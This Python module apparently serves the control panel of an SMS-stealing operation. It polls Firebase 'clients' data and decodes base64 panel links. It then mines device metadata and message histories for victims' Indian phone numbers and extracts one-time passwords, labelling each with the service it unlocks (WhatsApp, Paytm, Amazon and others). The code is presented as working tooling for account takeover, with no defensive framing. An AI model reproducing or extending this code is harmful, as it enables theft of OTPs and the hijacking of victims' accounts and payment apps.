import aiohttp, json, re, base64, time
from collections import Counter

async def fetch_fb(url, auth=None):
    full_url = url
    if auth and str(auth).strip() and str(auth) != "None":
        full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=4) as resp: # Fast Timeout
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception: pass
    return None

async def check_ping(url, auth=None):
    start = time.time()
    full_url = url
    if auth and str(auth).strip() and str(auth) != "None":
        full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{full_url}/clients.json?shallow=true", timeout=3) as resp:
                if resp.status == 200: return f"{int((time.time() - start) * 1000)}ms"
    except Exception: pass
    return "❌ Timeout"

def decode_panel_url(panel_url):
    match = re.search(r'([A-Za-z0-9+/=]{20,})', panel_url)
    if not match: return None
    b64_str = match.group(1)
    try:
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        decoded = base64.b64decode(b64_str).decode('utf-8')
        if "|||" in decoded: return decoded.split("|||")[0], ""
        try:
            data = json.loads(decoded)
            if isinstance(data, dict) and "url" in data: return data["url"], data.get("key", "")
        except json.JSONDecodeError:
            if decoded.startswith("http"): return decoded, ""
    except Exception: pass
    return None

# 🔥 MAHA-AGGRESSIVE NUMBER EXTRACTION
def extract_best_numbers(dev_data, msgs):
    found_nums = {}
    bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577", "1234567890", "0000000000"}

    # 1. Scan the ENTIRE device metadata (JSON dump) for any 10-digit number
    raw_metadata = json.dumps(dev_data)
    meta_matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', raw_metadata)
    for m in meta_matches:
        if m not in bad_numbers:
            found_nums[m] = 100 # 100% Confirm if found in metadata

    # 2. Scan Message History
    all_msg_text = " ".join([m.get("message", "") for m in msgs])
    msg_matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_msg_text)
    
    for num in set(msg_matches):
        if num in bad_numbers: continue
        
        score = 40 # Base score
        is_carrier = False
        
        # Check for Carrier messages (Jio/Airtel/Vi)
        for m in msgs:
            sender = str(m.get("sender", "")).lower()
            text = m.get("message", "").lower()
            if num in text:
                if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
                    is_carrier = True
                    break
                if any(f"{c} number" in text for c in ["jio", "airtel", "vi"]):
                    is_carrier = True
                    break
        
        if is_carrier: score = 100
        else: 
            # Increase score based on repeat frequency
            count = msg_matches.count(num)
            score = min(score + (count * 10), 95)
            
        if num not in found_nums or score > found_nums[num]:
            found_nums[num] = score

    # Sort and return top 2 max
    sorted_nums = sorted(found_nums.items(), key=lambda x: x[1], reverse=True)[:2]
    return sorted_nums

def extract_otp(text):
    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password", "sign-in"]): return None
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

def extract_service_name(text, sender):
    text_lower = text.lower()
    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel", "meesho": "Meesho"}
    for key, name in services.items():
        if key in text_lower: return name
    if sender and "-" in sender: return sender.split("-")[1]
    return "Unknown"
